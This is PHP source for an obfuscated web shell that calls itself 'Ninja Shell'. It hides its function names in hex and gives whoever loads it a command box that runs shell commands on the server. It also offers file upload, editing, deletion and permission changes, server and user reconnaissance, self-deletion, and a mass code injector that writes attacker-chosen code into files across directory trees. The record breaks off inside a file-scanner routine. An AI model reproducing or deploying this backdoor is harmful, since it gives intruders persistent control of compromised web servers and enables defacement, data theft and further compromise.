<?php

    header("X-XSS-Protection: 0");
    @clearstatcache();
    $set = "34303639364536393546373336353734";
    hex2bin(hex2bin("36463632354637333734363137323734323832393342"));
    hex2bin(hex2bin("3733363537333733363936463645354637333734363137323734323832393342"));
    hex2bin(hex2bin("373336353734354637343639364436353546364336393644363937343238333032393342"));
    hex2bin(hex2bin("3635373237323646373235463732363537303646373237343639364536373238333032393342"));
    hex2bin(hex2bin($set)).('("log_errors", 1)');
    hex2bin(hex2bin($set)).('("max_execution_time", 0)');
    hex2bin(hex2bin($set)).('("output_buffering", 0)');
    hex2bin(hex2bin($set)).('("display_errors", 0)');
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    
    $Array = [
        "7068705f756e616d65", //php_uname [0]
        "70687076657273696f6e", //phpversion [1]
        "6368646972", //chdir [2]
        "676574637764", //getcwd [3]
        "707265675f73706c6974", //preg_split [4]
        "636f7079", //copy [5]
        "66696c655f6765745f636f6e74656e7473", //file_get_contents [6]
        "6261736536345f6465636f6465", //base64_decode [7]
        "69735f646972", //is_dir [8]
        "6f625f656e645f636c65616e28293b", //ob_end_clean(); [9]
        "756e6c696e6b", //unlink [10]
        "6d6b646972", //mkdir [11]
        "63686d6f64", //chmod [12]
        "7363616e646972", //scandir [13]
        "7374725f7265706c616365", //str_replace [14]
        "68746d6c7370656369616c6368617273", //htmlspecialchars [15]
        "7661725f64756d70", //var_dump [16]
        "666f70656e", //fopen [17]
        "667772697465", //fwrite [18]
        "66636c6f7365", //fclose [19]
        "64617465", //date [20]
        "66696c656d74696d65", //filemtime [21]
        "737562737472", //substr [22]
        "737072696e7466", // sprintf [23]
        "66696c657065726d73", //fileperms [24]
        "746f756368", //touch [25]
        "66696c655f657869737473", //file_exists [26]
        "72656e616d65", //rename [27]
        "69735f6172726179", // is_array [28]
        "69735f6f626a656374", // is_object[29]
        "737472706f73", //strpos [30]
        "69735f7772697461626c65", //is_writable [31]
        "69735f7265616461626c65", //is_readable [32]
        "737472746f74696d65", //strtotime [33]
        "66696c6573697a65", //filesize [34]
        "726d646972", //rmdir [35]
        "6f625f6765745f636c65616e", //ob_get_clean [36]
        "7265616466696c65", //readfile [37]
        "617373657274", //assert [38]
        "636872", //chr [39]
        "696d706c6f6465", //implode [40]
        "707265675f7265706c616365", //preg_replace [41]
        "65786563", //exec [42],
        "7368656c6c5f65786563", //shell_exec [43]
        "73797374656d", //system [44]
        "7061737374687275", //passthru [45]
        "706f7369785f676574657569642829", //posix_geteuid()[46]
        "6469736b5f667265655f7370616365", // disk_free_space[47]
        "6469736b5f746f74616c5f7370616365", // disk_total_space [48]
        "6765746d79756964", //getmyuid [49]
        "6765746d79676964", //getmygid [50]
        "66696c656f776e6572", //fileowner [51]
        "66696c6567726f7570", // filegroup [52]
        "6765745f63757272656e745f75736572", //get_current_user [53]
        "70617468696e666f", //pathinfo [54]
        "626173656e616d65", //basename [55]
        "66696c655f7075745f636f6e74656e7473", //file_put_contents [56]
        "706f7369785f676574656769642829", //posix_getegid() [57]
        ""
    ];
    
    $___ = count($Array);
    for ($i = 0; $i < $___; $i++) {
        $ngehe = bin2hex($Array[$i]);
        $GNJ[] = hex2bin(hex2bin($ngehe));
        
    }
    
    global $GNJ;
    if (version_compare(PHP_VERSION, "5.3.0", "<")) {
        @set_magic_quotes_runtime(0);
    }
    
    function usergroup()
    {  
        global $GNJ;
        if (!function_exists("posix_getegid")) {
            $user["name"] = @$GNJ[53]();
            $user["uid"] = @getmyuid();
            $user["gid"] = @getmygid();
            $user["group"] = "?";
        } else {
            $user["uid"] = @posix_getpwuid($GNJ[46]);
            $user["gid"] = @posix_getgrgid($GNJ[57]);
            $user["name"] = $user["uid"]["name"];
            $user["uid"] = $user["uid"]["uid"];
            $user["group"] = $user["gid"]["name"];
            $user["gid"] = $user["gid"]["gid"];
        }
        return (object) $user;
    }
    
    function exe($cmd)
    {
        global $GNJ;
        
        if (function_exists("system")) {
            @ob_start();
            @$GNJ[44]($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists("exec")) {
            @$GNJ[42]($cmd, $results);
            $buff = "";
            foreach ($results as $result) {
                $buff .= $result;
            }
            return $buff;
        } elseif (function_exists("passthru")) {
            @ob_start();
            @$GNJ[45]($cmd);
            $buff = @ob_get_contents();
            @$GNJ[36]();
            return $buff;
        } elseif (function_exists("shell_exec")) {
            $buff = @$GNJ[43]($cmd);
            return $buff;
        }
    }
    
    $sm = @ini_get(strtolower("safe_mode")) == "on" ? "ON" : "OFF";
    $ds = @ini_get("disable_functions");
    $open_basedir = @ini_get("Open_Basedir");
    $safemode_exec_dir = @ini_get("safe_mode_exec_dir");
    $safemode_include_dir = @ini_get("safe_mode_include_dir");
    $show_ds = !empty($ds) ? "$ds" : "All Functions Is Accessible";
    $mysql = function_exists("mysql_connect") ? "ON" : "OFF";
    $curl = function_exists("curl_version") ? "ON" : "OFF";
    $wget = exe("wget --help") ? "ON" : "OFF";
    $perl = exe("perl --help") ? "ON" : "OFF";
    $ruby = exe("ruby --help") ? "ON" : "OFF";
    $mssql = function_exists("mssql_connect") ? "ON" : "OFF";
    $pgsql = function_exists("pg_connect") ? "ON" : "OFF";
    $python = exe("python --help") ? "ON" : "OFF";
    $magicquotes = function_exists("get_magic_quotes_gpc") ? "ON" : "OFF";
    $ssh2 = function_exists("ssh2_connect") ? "ON" : "OFF";
    $oracle = function_exists("oci_connect") ? "ON" : "OFF";
    
    $show_obdir = !empty($open_basedir) ? "OFF" : "ON";
    $show_exec = !empty($safemode_exec_dir) ? "OFF" : "ON";
    $show_include = !empty($safemode_include_dir) ? "OFF" : "ON";
    
    if (!function_exists("posix_getegid")) {
        $user = @$GNJ[53]();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    } else {
        
        $uid = @posix_getpwuid(posix_getpwuid());
        $gid = @posix_getgrgid(posix_getegid());
        $user = $uid["name"];
        $uid = $uid["uid"];
        $group = $gid["name"];
        $gid = $gid["gid"];
    }
    
    function hdd($s)
    {
        if ($s >= 1073741824) {
            return sprintf("%1.2f", $s / 1073741824) . " GB";
        } elseif ($s >= 1048576) {
            return sprintf("%1.2f", $s / 1048576) . " MB";
        } elseif ($s >= 1024) {
            return sprintf("%1.2f", $s / 1024) . " KB";
        } else {
            return $s . " B";
        }
    }
    
    $freespace = $GNJ[47]("/");
    $total = $GNJ[48]("/");
    
    $freespace_formatted = $GNJ[41]('/[^\d.]/', '', $freespace);
    $total_formatted = $GNJ[41]('/[^\d.]/', '', $total);
    
    $used = $total_formatted - $freespace_formatted;
    
    
    
    function path()
    {   
        global $GNJ;
        $stplace = $GNJ[14];
        if (isset($_GET["dir"])) {
            $dir = $stplace("\\", "/", $_GET["dir"]);
            @chdir($dir);
        } else {
            $dir = $stplace("\\", "/", $GNJ[3]());
        }
        return $dir;
    }
    $dir = scandir(path());
    foreach ($dir as $folder) {
        $dirinfo["path"] = path() . DIRECTORY_SEPARATOR . $folder;
        if (!is_dir($dirinfo["path"])) {
            continue;
        }
        $dirinfo["link"] =
            $folder === ".."
                ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>"
                : ($folder === "."
                    ? "<a href='?dir=" . path() . "'>$folder</a>"
                    : "<a href='?dir=" . $dirinfo["path"] . "'>$folder</a>");
        if (function_exists("posix_getpwuid")) {
            $dirinfo["owner"] = (object) @posix_getpwuid(
                $GNJ[51]($dirinfo["path"])
            );
            $dirinfo["owner"] = $dirinfo["owner"]->name;
        } else {
            $dirinfo["owner"] = $GNJ[51]($dirinfo["path"]);
        }
        if (function_exists("posix_getgrgid")) {
            $dirinfo["group"] = (object) @posix_getgrgid(
                $GNJ[52]($dirinfo["path"])
            );
            $dirinfo["group"] = $dirinfo["group"]->name;
        } else {
            $dirinfo["group"] = $GNJ[52]($dirinfo["path"]);
        }
    }
    
    function OS()
    {
        global $GNJ;
        $subst = $GNJ[22];
        return $subst(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
    }
    
    function ambilKata($param, $kata1, $kata2)
    {
        if ($GNJ[30]($param, $kata1) === false) {
            return false;
        }
        if ($GNJ[30]($param, $kata2) === false) {
            return false;
        }
        $start = $GNJ[30]($param, $kata1) + strlen($kata1);
        $end = $GNJ[30]($param, $kata2, $start);
        $return = $GNJ[22]($param, $start, $end - $start);
        return $return;
    }
    
    function windisk()
    {
        $letters = "";
        $v = explode("\\", path());
        $v = $v[0];
        foreach (range("A", "Z") as $letter) {
            $bool = $isdiskette = in_array($letter, ["A"]);
            if (!$bool) {
                $bool = is_dir("$letter:\\");
            }
            if ($bool) {
                $letters .=
                    "[ <a href='?dir=$letter:\\'" .
                    ($isdiskette
                        ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\""
                        : "") .
                    ">";
                if ($letter . ":" != $v) {
                    $letters .= $letter;
                } else {
                    $letters .= color(1, 2, $letter);
                }
                $letters .= "</a> ]";
            }
        }
        if (!empty($letters)) {
            print "Detected Drives $letters<br>";
        }
        if (count($quicklaunch) > 0) {
            foreach ($quicklaunch as $item) {
                $v = realpath(path() . "..");
                if (empty($v)) {
                    $a = explode(DIRECTORY_SEPARATOR, path());
                    unset($a[count($a) - 2]);
                    $v = join(DIRECTORY_SEPARATOR, $a);
                }
                print "<a href='" . $item[1] . "'>" . $item[0] . "</a>";
            }
        }
    }

?>
	<!DOCTYPE html>
	<html dir="auto" lang="en-US">

	<head>
		<meta charset="UTF-8">
		<meta name="robots" content="NOINDEX, NOFOLLOW">

		<title>1298371287358y</title>

		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	</head>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <style type="text/css">
        a:link {
             color: wheat;
             background-color: transparent;
             text-decoration: none;
          }
          a:visited {
             color: deepskyblue;
             background-color: transparent;
             text-decoration: none;
          }
          a:active {
             color: yellow;
             background-color: transparent;
          }
        @media (min-width: 1200px) {
          .container {
            width: auto;
          }
        }
        body{
            color: white;
        }
        .paper {
            padding: 28px 55px 27px;
            position: relative;
            border: 1px solid #b5b5b5;
            background: white;
            background: -webkit-linear-gradient(top, #dfe8ec 0%, white 8%) 0 57px;
            background: -moz-linear-gradient(top, #dfe8ec 0%, white 8%) 0 57px;
            background: linear-gradient(top, #dfe8ec 0%, white 8%) 0 57px;
            -webkit-background-size: 100% 30px;
            -moz-background-size: 100% 30px;
            -ms-background-size: 100% 30px;
            background-size: 100% 30px;
            overflow: auto;
            max-height: 400px;
        }
    
        .paper::before {
            content: "";
            z-index: -1;
            margin: 0 1px;
            width: 706px;
            height: 10px;
            position: absolute;
            bottom: -3px;
            left: 0;
            background: white;
            border: 1px solid #b5b5b5;
        }
    
        .paper::after {
            content: "";
            position: absolute;
            width: 0px;
            top: 0;
            left: 39px;
            bottom: 0;
            border-left: 1px solid #f8d3d3;
        }
        .container {
           max-width: 70% !important;/*Set your own width %; */
        }
        hr {
            display: block;
            height: 1px;
            border: 0;
            border-top: 1px solid #ccc;
            margin: 1em 0;
            padding: 0;
        }
    </style>
	<body class="bg-dark">
	    <br><br>
        <div class="container border border-white">
            		
		<br><br>
		<div class="border border-white">
			<nav class="navbar navbar-expand-lg navbar-dark bg-dark ">
    	<?php
             if (isset($_GET["d"])) {
                 $d = uhex($_GET["d"]);
                 $GNJ[2](uhex($_GET["d"]));
             } else {
                 $d = $GNJ[3]();
             }
             $k = $GNJ[4]("/(\\\|\/)/", $d);
         ?>

	<br />
	<div class="collapse navbar-collapse justify-content-center" id="navbarNav">
		<ul class="navbar-nav">
			<li class="nav-item active">
				<a class="nav-link ajx" href="?">
					<font color="red">Home</font>
				</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex("info") ?>">Info</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "auto_tools"
) ?>">Auto Tools</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "scanner"
) ?>">Scanner</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "killself"
) ?>">KillSelf</a>
			</li>
			<li class="nav-item active">
				<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex(
    "saveme"
) ?>">SaveMe</a>
			</li>
		</ul>
	</div>

	<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
		<span class="navbar-toggler-icon"></span>
	</button>

</nav>
			
		</div>
		<?php


		?>

<?php
echo "<br>Current Directory : ";
foreach ($k as $m => $l) {
    if ($l == "" && $m == 0) {
        echo '<a class="ajx" href="?d=2f">/</a>';
    }
    if ($l == "") {
        continue;
    }
    echo '<a class="ajx" href="?d=';
    for ($i = 0; $i <= $m; $i++) {
        echo hex($k[$i]);
        if ($i != $m) {
            echo "2f";
        }
    }
    echo '">' . $l . "</a>/";
}
echo " (" . x("$d/$c") . ")";
echo "<br>Kernel Version : " . php_uname(). "\n";
echo "<br>";
echo "Free space: " . hdd($freespace) . "\n";
echo "Total space: " . hdd($total) . "\n";
echo "Used space: " . hdd($used) . "\n";
print "<br>";
print OS() === "Windows" ? windisk() : "";
echo "<br><br>";

echo "<div class='container'><div class='row'>
  <div class='col'><a class='btn btn-outline-secondary btn-sm ml-3 ajx' href='?d=" .
    hex($d) .
    "&n'>New File</a>
  <a class='btn btn-outline-secondary btn-sm ml-3 ajx' href='?d=" .
    hex($d) .
    "&l'>New Dir</a></div>
  <form method='post'>
				<font color = 'wheat'>" .
    $user .
    "@" .
    gethostbyname($_SERVER["HTTP_HOST"]) .
    ": ~ $ </font>&nbsp;
				<input style='border: none; border-bottom: 1px solid #000;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #000;' type='submit' name='do_cmd' value='>>'>
				</form></div></div>";
echo "<br>";

echo "<div class='u'>
        <table class='table table-transparent'>
            <tr>
                <td>
                    <form method='post' enctype='multipart/form-data' class='d-inline'>
                        <label class='l w'>
                            <input type='file' name='n[]' onchange='this.form.submit()' multiple class='form-control mr-3'>
                        </label>
                    </form>
                </td>
                <td>";
$o_ = [
    '<script>$.notify("',
    '", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>',
];
$f = $o_[0] . "Success!" . $o_[1];
$g = $o_[0] . "Failed!" . $o_[1];
if (isset($_FILES["n"])) {
    $z = $_FILES["n"]["name"];
    $r = count($z);
    for ($i = 0; $i < $r; $i++) {
        if ($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
            echo $f;
        } else {
            echo $g;
        }
    }
}
echo "</td>
            </tr>
        </table>
    </div>";
if ($_POST["do_cmd"]) {
    echo '<br><div id="phpss" class="paper"><pre>' .
        exe($_POST["cmd"]) .
        "</pre></div>";
}

$a_ = '<table cellspacing="0" border="1" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
$c_ = '</td>
							</tr>
						</tbody>
					</table>';
$d_ = '<br />
										<br />
										<input type="submit" class="form-control col-md-3" value="&nbsp;OK&nbsp;" />
									</form>';

if (isset($_GET["s"])) {
    echo $a_ .
        uhex($_GET["s"]) .
        $b_ .
        '
									<textarea rows="20" readonly class = "form-control">' .
        $GNJ[15]($GNJ[6](uhex($_GET["s"]))) .
        '</textarea>
									<br />
									<br />
									<div style="overflow: hidden;">
                                        <input onclick="location.href=\'?d=' . $_GET["d"] . '&e=' . $_GET["s"] . '\'" type="submit" class="form-control col-md-3" value="&nbsp;EDIT&nbsp;" style="float: left;" />
                                        <a href="?d='. $_GET["d"] .'&x='.$_GET["s"] .'" class="form-control col-md-3 btn btn-light" style="float: right;">&nbsp;HAPUS&nbsp;</a>
                                    </div>' . $c_;
} elseif (isset($_GET[hex("saveme")])) {
    $direktori = $_SERVER['DOCUMENT_ROOT'];
    echo $direktori;
    
} elseif (isset($_GET["y"])) {
    echo $a_ .
        "REQUEST" .
        $b_ .
        '
									<form method="post">
										<input class="form-control md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
										<input class="form-control md-3" type="text" name="2" autocomplete="off" />
										' .
        $d_ .
        '
									<br />
									<textarea readonly class = "form-control">';

    if (isset($_POST["2"])) {
        echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
    }

    echo '</textarea>
								' . $c_;
} elseif (isset($_GET["e"])) {
    echo $a_ .
        uhex($_GET["e"]) .
        $b_ .
        '
									<form method="post">
										<textarea rows="20" name="e" class="form-control">' .
        $GNJ[15]($GNJ[6](uhex($_GET["e"]))) .
        '</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<center><select id="b64" name="b64" class = "form-control col-md-3">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select></center>
										' .
        $d_ .
        '
								' .
        $c_ .
        '
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
    if (isset($_POST["e"])) {
        if ($_POST["b64"] == "1") {
            $ex = $GNJ[7]($_POST["e"]);
        } else {
            $ex = $_POST["e"];
        }
        $fp = $GNJ[17](uhex($_GET["e"]), "w");
        if ($GNJ[18]($fp, $ex)) {
            OK();
        } else {
            ER();
        }
        $GNJ[19]($fp);
    }
} elseif (isset($_GET["x"])) {
    rec(uhex($_GET["x"]));
    if ($GNJ[26](uhex($_GET["x"]))) {
        ER();
    } else {
        OK();
    }
} elseif (isset($_GET["t"])) {
    echo $a_ .
        uhex($_GET["t"]) .
        $b_ .
        '
									<form action="" method="post">
										<input name="t" class="form-control col-md-3" autocomplete="off" type="text" value="' .
        $GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))) .
        '">
										' .
        $d_ .
        '
								' .
        $c_;
    if (!empty($_POST["t"])) {
        $p = $GNJ[33]($_POST["t"]);
        if ($p) {
            if (!$GNJ[25](uhex($_GET["t"]), $p, $p)) {
                ER();
            } else {
                OK();
            }
        } else {
            ER();
        }
    }
} elseif (isset($_GET["k"])) {
    echo $a_ .
        uhex($_GET["k"]) .
        $b_ .
        '
									<form action="" method="post">
										<input name="b" autocomplete="off" class="form-control col-md-3" type="text" value="' .
        $GNJ[22]($GNJ[23]("%o", $GNJ[24](uhex($_GET["k"]))), -4) .
        '">
										' .
        $d_ .
        '
								' .
        $c_;
    if (!empty($_POST["b"])) {
        $x = $_POST["b"];
        $t = 0;
        for ($i = strlen($x) - 1; $i >= 0; --$i) {
            $t += (int) $x[$i] * pow(8, strlen($x) - $i - 1);
        }
        if (!$GNJ[12](uhex($_GET["k"]), $t)) {
            ER();
        } else {
            OK();
        }
    }
} elseif (isset($_GET["l"])) {
    echo $a_ .
        "+DIR" .
        $b_ .
        '
									<form action="" method="post">
										<input name="l" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' .
        $d_ .
        '
								' .
        $c_;
    if (isset($_POST["l"])) {
        if (!$GNJ[11]($_POST["l"])) {
            ER();
        } else {
            OK();
        }
    }
} elseif (isset($_GET["q"])) {
    if ($GNJ[10](__FILE__)) {
        $GNJ[38]($GNJ[9]);
        header("Location: " . $GNJ[55]($_SERVER["PHP_SELF"]) . "");
        exit();
    } else {
        echo $g;
    }
} elseif (isset($_GET[hex("info")])) {
    echo '<hr>SYSTEM INFORMATION<center>
    <div class="form-control paper" style="text-align: left;" readonly><p class="text-left"><pre>
    
Server                  : ' .
        $_SERVER["HTTP_HOST"] .
        '
Server IP               : ' .
        $_SERVER["SERVER_ADDR"] .
        " Your IP : " .
        $_SERVER["REMOTE_ADDR"] .
        '
Kernel Version          : ' .
        php_uname() .
        '
Software                : ' .
        $_SERVER["SERVER_SOFTWARE"] .
        '
Storage Space           : ' .
        $used .
        "/" .
        $total .
        "(Free : " .
        $freespace .
        ")" .
        '
User / Group            : ' .
        $user .
        " (" .
        $uid .
        ") | " .
        $group .
        " (" .
        $gid .
        ') 
Time On Server          : ' .
        date("d M Y h:i:s a") .
        '
Disable Functions       : ' .
        $show_ds .
        '
Safe Mode               : ' .
        $sm .
        '
PHP VERSION             : ' .
        phpversion() .
        " On " .
        php_sapi_name() .
        '

Open_Basedir : ' .
        $show_obdir .
        " | Safe Mode Exec Dir : " .
        $show_exec .
        " | Safe Mode Include Dir : " .
        $show_include .
        '
MySQL : ' .
        $mysql .
        " | MSSQL : " .
        $mssql .
        " | PostgreSQL : " .
        $pgsql .
        " | Perl : " .
        $perl .
        " | Python : " .
        $python .
        " | Ruby : " .
        $ruby .
        " |  WGET : " .
        $wget .
        " | cURL : " .
        $curl .
        " | Magic Quotes : " .
        $magicquotes .
        " | SSH2 : " .
        $ssh2 .
        " | Oracle : " .
        $oracle .
        ' 
    </pre></p>
    </div>
    </center>';
} elseif (isset($_GET[hex("auto_tools")])) {
    echo '<hr><center><h2>Auto Tools Ninja Shell </h2><br>
<table style="width:90%">

<tr>	
    <td><a class = "form-control ajx" href = ?d=' .
        hex($d) .
        "&" .
        hex("inject-code") .
        '><center>Inject Code</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' .
        hex($d) .
        "&" .
        hex("db-dump") .
        '><center>DB Dump</center></a></td>
</tr>
</table>
<br><hr>';
} elseif (isset($_GET[hex("inject-code")])) {
    echo "<hr><br>";
    echo "<center><h2>Mass Code Injector Ninja Shell</h2></center>";

    if (stristr(php_uname(), "Windows")) {
        $DS = "\\";
    } elseif (stristr(php_uname(), "Linux")) {
        $DS = "/";
    }
    function get_structure($path, $depth)
    {
        global $DS;
        $res = [];
        if (in_array(0, $depth)) {
            $res[] = $path;
        }
        if (in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path . $DS . "*", GLOB_ONLYDIR);
            if (in_array(1, $depth)) {
                $res = array_merge($res, $tmp1);
            }
        }
        if (in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = [];
            foreach ($tmp1 as $t) {
                $tp2 = glob($t . $DS . "*", GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if (in_array(2, $depth)) {
                $res = array_merge($res, $tmp2);
            }
        }
        if (in_array(3, $depth)) {
            $tmp3 = [];
            foreach ($tmp2 as $t) {
                $tp3 = glob($t . $DS . "*", GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res, $tmp3);
        }
        return $res;
    }

    if (isset($_POST["submit"]) && $_POST["submit"] == "Inject") {
        $name = $_POST["name"] ? $_POST["name"] : "*";
        $type = $_POST["type"] ? $_POST["type"] : "html";
        $path = $_POST["path"] ? $_POST["path"] : $GNJ[3]();
        $code = $_POST["code"] ? $_POST["code"] : "Pakistan Haxors Crew";
        $mode = $_POST["mode"] ? $_POST["mode"] : "a";
        $depth = sizeof($_POST["depth"]) ? $_POST["depth"] : ["0"];
        $dt = get_structure($path, $depth);
        foreach ($dt as $d) {
            if ($mode == "a") {
                if (
                    $GNJ[56](
                        $d . $DS . $name . "." . $type,
                        $code,
                        FILE_APPEND
                    )
                ) {
                    echo "<div><strong>" .
                        $d .
                        $DS .
                        $name .
                        "." .
                        $type .
                        '</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>' .
                        $d .
                        $DS .
                        $name .
                        "." .
                        $type .
                        "</strong></div>";
                }
            } else {
                if ( $GNJ[56]($d . $DS . $name . "." . $type, $code)) {
                    echo "<div><strong>" .
                        $d .
                        $DS .
                        $name .
                        "." .
                        $type .
                        '</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>' .
                        $d .
                        $DS .
                        $name .
                        "." .
                        $type .
                        "</strong></div>";
                }
            }
        }
    } else {
        echo '<form method="post" action="">
        <center>
                <table align="center">
                    <tr><br>
                        <td>Directory : </td>
                        <td><input class = "form-control" type = "text" class="box" name="path" value="' .
            $GNJ[3]() .
            '" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select class = "form-control" style="width: 150px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td><br>
                            <input class = "form-control" type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                         
                            <select class = "form-control" style="width: 150px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea class = "form-control" name="code" style= "width:100%"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="' .
            htmlspecialchars($GLOBALS["cwd"]) .
            '">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="' .
            (isset($_POST["charset"]) ? $_POST["charset"] : "") .
            '">
                            <input class = "form-control" style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    <br></tr>
                </table>
        </form>';
    }
    echo "<hr><br>";
} elseif (isset($_GET[hex("scanner")])) {
    echo "<hr><br>";
    echo "<center><h2>Scanner</h2></center><br>";
    echo "<form method='POST'>
            <center>
                <div class='row clearfix'>
                    <div class='col-md-4 p-3'>
                        <a class='form-control ajx' href='?d=" . hex($d) . "&" . hex("shell-scanner") . "'  style='width: 250px;' height='10'><center>Shell Scanner</center></a>
                    </div>
                </div>
            </center>
        </form>";
    echo "<hr>";
} elseif (isset($_GET[hex("shell-scanner")])) {
$minute = 60;
$limit = (60 * $minute); // 60 (seconds) = 1 Minutes
hex2bin(hex2bin($set)).("('memory_limit', '-1')");
hex2bin(hex2bin($set)).("('max_execution_time', $limit)");
$tl = "343037333635373435463734363936443635354636433639364436393734";
hex2bin(hex2bin($tl)).("($limit)");

function recursiveScan($directory, &$entries_array = array()) {
    // Check if the directory exists and is readable
    if (!is_dir($directory) || !is_readable($directory)) {
        return $entries_array;
    }

    // Open the directory
    $handle = opendir($directory);
    if (!$handle) {
        return $entries_array;
    }

    // Iterate over the directory contents
    while (($entry = readdir($handle)) !== false) {
        // Skip the current directory and parent directory
        if ($entry === '.' || $entry === '..') {
            continue;
        }

        // Get the full path to the entry
        $entryPath = $directory . DIRECTORY_SEPARATOR . $entry;

        // Check if the entry is a symlink
        if (is_link($entryPath)) {
            continue;
        }

        // Check if the entry is a directory
        if (is_dir($entryPath)) {
            // Recursively scan the directory
            recursiveScan($entryPath, $entries_array);
        } elseif (is_readable($entryPath)) {
            // Add the file to the readable array
            $entries_array['file_readable'][] = $entryPath;
        } else {
            // Add the file to the non-readable array
            $entries_array['file_not_readable'][] = $entryPath;
        }
    }

    // Close the directory
    closedir($handle);

    // Return the entries array
    return $entries_array;
}

function sortByLastModified($files) {
    array_multisort(array_map('filemtime', $files), SORT_DESC, $files);
    return $files;
}

function getSortedByTime($path) {
    // Get the readable and non-readable files from the directory
    $result = recursiveScan($path);
    $readable = $result['file_readable'];
    $notReadable = isset($result['file_not_readable']) ? $result['file_not_readable'] : array();

    // Sort the readable files by their last modified time
    $readable = sortByLastModified($readable);

    // Return the sorted files
    return array(
        'file_readable' => $readable,
        'file_not_readable' => $notReadable,
    );
}

function getSortedByExtension($path, $ext) {
    global $GNJ;
    $result = getSortedByTime($path);
    $fileReadable = $result['file_readable'];
    $fileNotReadable = isset($result['file_not_readable']) ? $result['file_not_readable'] : array();

    $sortedWritableFile = [];
    $sortedNotWritableFile = [];

    foreach ($fileReadable as $entry) {
        $pathinfo = $GNJ[54]($entry, PATHINFO_EXTENSION);
        $pathinfo = strtolower($pathinfo);

        if (in_array($pathinfo, $ext)) {
            $sortedWritableFile[] = $entry;
        }
    }

    foreach ($fileNotReadable as $entry) {
        $pathinfo = $GNJ[54]($entry, PATHINFO_EXTENSION);
